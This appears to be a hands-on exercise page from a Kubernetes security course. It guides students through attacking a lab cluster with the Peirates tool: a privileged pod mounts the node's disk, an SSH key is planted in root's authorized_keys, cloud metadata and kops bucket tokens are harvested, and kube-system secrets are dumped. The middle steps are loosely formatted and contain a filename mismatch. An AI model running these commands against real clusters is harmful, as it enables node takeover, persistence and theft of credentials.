---
layout: exercise
title: "Exercise: Peirates"
exercise: 100
tools: openssh-client 
directories_to_sync: ssh-config K8S-Exercise
---


1. (*NOTE: You'll only need to do this step if you skipped the [Kubernetes Cloud Attacks](/exercises/cloud-attacks/) exercise*).

    The course proctors will provide you with a cloud cluster ID number (`N`). Store this number in your shell profile in a new variable `CLOUD_ID`, and then read this new variable into your environment now:

    ```shell
    # Replace the "N" in `CLOUD_ID=N` with the ID number provided by the proctors
    echo "export CLOUD_ID=N" >> ~/.bashrc
    bash
    source ~/.bashrc
    ```

2. We'll be using the same cloud cluster as in [Kubernetes Cloud Attacks](/exercises/cloud-attacks/), so let's set an `alias`:

    ```shell
    alias kubectl="/root/K8S-Exercise/kubectl \
    --server=$(cat /sync/.cloud_clusters/serverip-$CLOUD_ID ) \
    --token=$(cat /sync/.cloud_clusters/token-cluster-$CLOUD_ID ) \
    --certificate-authority=/sync/.cloud_clusters/ca.crt-$CLOUD_ID"
    ```





3. And test that it works:

    ```shell
    kubectl get pods
    ```



Create an SSH key:
   ssh-keygen
See
"Enter file in which to save the key (/root/.ssh/id_rsa): "
hit Enter
See
Enter passphrase (empty for no passphrase): 
Hit enter
see
Enter same passphrase again: 
Hit Enter

   cat out the ssh key
   cat ~/.ssh/id_rsa.pub
   
   Copy the ssh key into the priv pod

   cat ~/.ssh/id_rsa.pub | kubectl exec -i priv -- /bin/bash -c "cat >id_rdsa.pub"




4. Let's start a `hostNetwork` pod based on Peirates:

    ```shell
    kubectl --dry-run=client -o json run peirates --image=bustakube/alpine-peirates | jq '.spec.hostNetwork=true' | kubectl create -f -
    ```

    Alternatively, we could exec into the priv pod and pull down Peirates:

    ```shell
    kubectl exec -it priv -- /bin/bash
    apk add wget
    github="https://github.com/inguardians/peirates"
    wget ${github}/releases/download/v1.1.10/peirates-linux-amd64.tar.xz
    tar -xvf peirates-linux-amd64.tar.xz
    mv peirates-linux-amd64/peirates /usr/bin/
    chmod 755 /usr/bin/peirates
    peirates
    ```


   Copy peirates into the node's filesystem
   mount /dev/sda1 /mnt
   cp /usr/bin/peirates /mnt/usr/bin/

   Add an SSH key to the node's filesystem
   mkdir /mnt/root/.ssh
   cat ~/id_rsa.pub >>/mnt/root/.ssh/authorized_keys
   chmod -R go-rwx /mnt/root/.ssh


5. Exec into your peirates pod:

    ```shell
    kubectl exec -it peirates -- /bin/bash
    ```

6. Run peirates:

    ```shell
    peirates
    ```

7. Let's ask the metadata API for credentials:

    ```shell
    get-gcp-token
    ```

8. Hit `Enter` to get back to the menu, do this whenever a function in Peirates ends.

9. Now, let's try our kops GCP-bucket attack:

    ```shell
    attack-kops-gcs-1
    ```

10. Choose to store the tokens found in the bucket:

    ```shell
    1
    ```

11. That got us quite a few service account tokens. See them and get ready to switch to one by typing:

    ```shell
    sa-menu
    ```

12. Switch service accounts:

    ```shell
    switch
    ```

13. Choose the admin token, which should be option `1`.

    ```shell
    1
    ```

14. Now switch your namespace to the `kube-system` control plane namespace. First, bring up the namespace menu:

    ```shell
    ns-menu
    ```

15. Now, choose `switch`:

    ```shell
    switch
    ```

16. Switch to the `kube-system` namespace:

    ```shell
    kube-system
    ```

17. List the secrets in this namespace:

    ```shell
    list-secrets
    ```

18. Now ask to use a `kubectl` command:

    ```shell
    kubectl
    ```

19. Pick a command to run, like:

    ```shell
    get secrets -o yaml
    ```

20. Play around some more, then check out our GitHub page and contribute:

[https://github.com/inguardians/peirates](https://github.com/inguardians/peirates)
